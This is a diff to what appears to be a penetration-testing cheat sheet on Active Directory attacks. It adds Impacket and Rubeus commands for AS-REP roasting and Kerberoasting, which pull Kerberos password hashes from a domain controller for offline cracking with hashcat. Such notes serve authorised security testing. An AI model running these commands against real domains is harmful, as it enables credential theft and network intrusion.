@@ -111,6 +111,8 @@ Use tools like Impacket-GetNPUsers and Rubeus to do an ASREPRoasting attack
 
 Linux
 
+        impacket-GetNPUsers -no-pass -usersfile unames.txt DOMAIN.LOCAL/
+
         Impacket-GetNPUsers domain/username -no-pass -dc-ip DC_IP -outputfile asreproastinghashes.txt
 
         Impacket-GetNPUsers domain/ -usersfile usernames.txt -format hashcat -dc-ip DC_IP -dc-host dc.domain.local -outputfile hashesdomain.txt
@@ -177,11 +179,13 @@ Get TGS hash
 
 Linux
 
+        impacket-GetUserSPNs DOMAIN.LOCAL\SVC_TGS -request 
+        
         Impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/USER:PASSWORD
 
 Windows
 
-        Rubeus kerberoast
+        Rubeus kerberoast /nowrap
 
 Then, crack the hash with hashcat
 
